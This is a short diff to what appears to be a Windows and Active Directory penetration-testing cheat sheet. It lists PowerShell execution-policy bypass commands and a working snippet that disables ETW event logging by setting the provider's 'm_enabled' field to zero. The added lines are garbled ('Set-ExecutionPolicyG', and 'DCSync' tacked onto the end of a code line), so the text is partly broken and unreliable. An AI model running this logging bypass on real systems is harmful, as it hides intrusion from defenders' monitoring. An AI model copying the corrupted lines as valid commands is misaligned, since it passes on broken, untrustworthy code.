@@ -316,6 +316,7 @@ C
 - powershell -exec bypass
 - powershell -ep bypass
   - Set-ExecutionPolicy Bypass -Scope Process
+  - Set-ExecutionPolicyG
   - Get-ExecutionPolicy -List
 - systeminof
   - part of Active Directory (workgroup / domain)
@@ -704,7 +705,7 @@ $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEt
 $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
 
 # set field m_enabled do previous sotred value
-[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
+[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);DCSync
 ```
 
  **Group Policy Takeover**
